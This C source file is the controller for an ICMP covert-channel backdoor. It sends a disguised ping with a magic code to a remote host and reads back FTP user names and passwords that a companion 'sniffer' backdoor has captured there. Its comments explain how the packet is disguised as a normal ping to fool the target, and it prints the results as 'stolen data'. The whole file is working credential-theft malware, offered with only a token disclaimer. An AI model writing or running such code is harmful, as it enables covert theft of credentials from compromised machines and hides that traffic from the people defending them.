/*
author: duanjigang <duanjigang1983@126.com,duanjigang1983@gmail.com>
des: a faked ping message to get  loading user names and
password of the FTP service from a remote machine,
the user names and password are sniffered by our
backdoor process "sniffer" running on the remote machine 
warnings: please do not use it for any malicious purpose,and
i will take no charge for any damage it brings for you ^_^
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>
/*
use this flag to identify our magic icmp echo-reply message
including user names and password
*/
#define MAGIC_REPLY 0X16
/*
use this special flag to tell the back door process that
this is a magic message who is to fetch a pair of user name and
password, when the program is run one time, it may get a pair
of password and user name, if the name equals to "InvalidName"
and Password equals to "InvalidPassWord", it means that there is 
no user name and password sniffered
*/
#define MAGIC_CODE 0X5B

struct node
{
 char Name[15];/*user name*/
 char PassWord[15];/*password*/
 unsigned int ip;/*destination ip address*/
 struct node * next;/*there may be not only one 
 pair of user name and password, so we use a list to
 store any many loading messages as possible*/
};
/*
to get mac address and ip address, it works better
on Linux system(kernel-2.4 and kernel-2.6), solaris9,
freebsd
*/
static int GetMacIP(char MAC[], char IP[]);
static unsigned short checksum(int numwords, unsigned  short *buff);
int main(int argc, char *argv[])
{
    unsigned char dgram[256];           
    unsigned char recvbuff[256];
    char mac[20],ip[20];
    int len, ip_len, icmp_len;
    struct iphdr* iph;
    struct icmphdr* icmph;
    struct ip *iphead = (struct ip *)dgram;
    struct icmp *icmphead = (struct icmp *)(dgram + sizeof(struct ip));
    struct sockaddr_in src;
    struct sockaddr_in addr;
    struct in_addr my_addr;
    struct in_addr serv_addr;
    struct node *store;
    socklen_t src_addr_size = sizeof(struct sockaddr_in);
    int icmp_sock = 0;
    int one = 1;
    int *ptr_one = &one;
    struct timeval *tm;
    if (argc != 2) 
    {
		fprintf(stderr, "Usage:%s remoteIP\n", argv[0]);
		exit(1);
    }
	/*
	create a raw socket with protocol icmp
	*/
    if ((icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) 
	{
         fprintf(stderr, "Couldn't open raw socket\n");
         exit(1);
       }
	/*
	set option IP_HDRINCL telling the drivers that the ip header
	message will be filled by ourselves but not the os
	*/
    if(setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL,
		ptr_one, sizeof(one)) < 0) 
    {
		close(icmp_sock);
		fprintf(stderr, "Couldn't set HDRINCL option\n");
		exit(1);
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(argv[1]);
    GetMacIP(mac, ip);
    //test the function 
	printf("myip: %s,mymac:%s\n", ip, mac);
    //tell sniffer our ip address to fetch data
	my_addr.s_addr = inet_addr(ip);
    
    memset(dgram, 0x00, 256);
    memset(recvbuff, 0x00, 256);
  
	iphead->ip_hl  = 5;
    iphead->ip_v   = 4;
    iphead->ip_tos = 0;
    iphead->ip_len = 128;
    iphead->ip_id  = (unsigned short)rand();
    iphead->ip_off = 0;
    iphead->ip_ttl = 128;
    iphead->ip_p   = IPPROTO_ICMP;
    iphead->ip_sum = 0;
    iphead->ip_src = my_addr;
    iphead->ip_dst = addr.sin_addr;
    /*
	with type equalling to ICMP_ECHO, just to cheat
	the remote machine so that it consider our message
	as a normal ping message
	*/
	icmphead->icmp_type = ICMP_ECHO;
    /*
	on a linux machine, value of icmp_code is not
	checked, so we can use it to indentify our magic message 
	*/
	icmphead->icmp_code = MAGIC_CODE;
	//befor sending, calculate the check sum
    icmphead->icmp_cksum = checksum(64, (unsigned short *)icmphead);
    
	/*
	sending our faked ping message to remote machine
	*/
    if (sendto(icmp_sock, dgram, 128, 0, (struct sockaddr *)&addr,
		sizeof(struct sockaddr)) < 0) 
    {
		fprintf(stderr, "\nFailed sending request\n");
		return 0;
    }else
		printf("PING %s\n", argv[1]);   
/*
	Three messages will be read from the system buffer, the first is
	the messge you sent out(in fact, I have not thought of the reason
	why it is), second is the ping echo reply message the remote 
	machine sending back, and the last may be the faked echo reply
	message sent by our backdoor process which stores the user names
	and password in the packet, so we will continue to read echo reply
	message untill we read an reply message with magic reply in it
	*/
START:
    len = recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src,
		&src_addr_size);
	if(len < 0)
	{
		fprintf(stdout, "Failed getting reply packet\n");
		close(icmp_sock);
		exit(1);
	}
	
	iphead = (struct ip *)recvbuff;
	ip_len = iphead->ip_hl << 2;
	icmph = (struct icmphdr *)(recvbuff + ip_len);
	icmp_len = len - ip_len;
	
	if(icmp_len < 8)
	{
		fprintf(stdout, "error icmp head\n");
		close(icmp_sock);
		return 0;
	} 
	
    if(icmph->type != ICMP_ECHOREPLY || icmph->code != MAGIC_REPLY) 
	{
		goto START;
	}
	store = (struct node*)(icmph + 1);
	printf("stolen data from %s:", inet_ntoa(store->ip));
	printf(" name: %s,password: %s\n", store->Name, store->PassWord);
	close(icmp_sock);
	return 0;
}
static unsigned short checksum(int numwords, unsigned  short *buff)
{
   unsigned long sum;
   
   for(sum = 0;numwords > 0;numwords--)
     sum += *buff++;   
   sum = (sum >> 16) + (sum & 0xFFFF);
   sum += (sum >> 16);
   return ~sum;
}
static int GetMacIP(char MAC[], char IP[])
{
	register int fd, intrface, retn = 0;
	register int up, ip, mac;
	struct ifreq buf[16];
	struct arpreq arp;
	struct ifconf ifc;
    if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) >= 0)
	{
		ifc.ifc_len = sizeof buf;
		ifc.ifc_buf = (caddr_t) buf;
		if (!ioctl (fd, SIOCGIFCONF, (char *) &ifc))
		{
			intrface = ifc.ifc_len / sizeof (struct ifreq);
			while (intrface-- > 0)
			{
				
                up = mac = ip = 0;
				if (!(ioctl (fd, SIOCGIFFLAGS, (char *) &buf[intrface])))
				{
					if (buf[intrface].ifr_flags & IFF_PROMISC)
					{
						
					}
				}
				if (buf[intrface].ifr_flags & IFF_UP)
				{
					up = 1;
				}
				if (!(ioctl (fd, SIOCGIFADDR, (char *) &buf[intrface])))
				{
					memset(IP, 0, 20);
					sprintf(IP, "%s",
						(char*)inet_ntoa(((struct sockaddr_in*)
						(&buf[intrface].ifr_addr))->sin_addr));
					ip = 1;
				}
#ifdef __sun__
				arp.arp_pa.sa_family = AF_INET;
				arp.arp_ha.sa_family = AF_INET;
				((struct sockaddr_in*)&arp.arp_pa)->sin_addr.s_addr=
					((struct sockaddr_in*)(&buf[intrface].ifr_addr))
					->sin_addr.s_addr;
				if (!(ioctl (fd, SIOCGARP, (char *) &arp)))
				{
					mac = 1;
					memset(MAC, '\0', 20);
					sprintf(MAC ,"%02x:%02x:%02x:%02x:%02x:%02x",
						(unsigned char)arp.arp_ha.sa_data[0],
						(unsigned char)arp.arp_ha.sa_data[1],
						(unsigned char)arp.arp_ha.sa_data[2],
						(unsigned char)arp.arp_ha.sa_data[3],
						(unsigned char)arp.arp_ha.sa_data[4],
						(unsigned char)arp.arp_ha.sa_data[5]);
				}
#else
#if 0
				if (!(ioctl (fd,  SIOCGENADDR, (char *) &buf[intrface])))
				{
					mac = 1;
					memset(MAC, '\0', 20);
					sprintf(MAC, "%02x:%02x:%02x:%02x:%02x:%02x",
						(unsigned char)buf[intrface].ifr_enaddr[0],
						(unsigned char)buf[intrface].ifr_enaddr[1],
						(unsigned char)buf[intrface].ifr_enaddr[2],
						(unsigned char)buf[intrface].ifr_enaddr[3],
						(unsigned char)buf[intrface].ifr_enaddr[4],
						(unsigned char)buf[intrface].ifr_enaddr[5]);
				}
#endif
				if (!(ioctl (fd, SIOCGIFHWADDR, (char *) &buf[intrface])))
				{
                    mac = 1;
                    memset(MAC, 0, 20);
					sprintf(MAC, "%02x:%02x:%02x:%02x:%02x:%02x",
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[0],
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[1],
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[2],
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[3],
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[4],
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[5]);
				}
#endif
				if(ip && mac && up)
				{
					close(fd);
					return 1;
				}
			}
		} 
	} 
	close (fd);
	return 0;
}


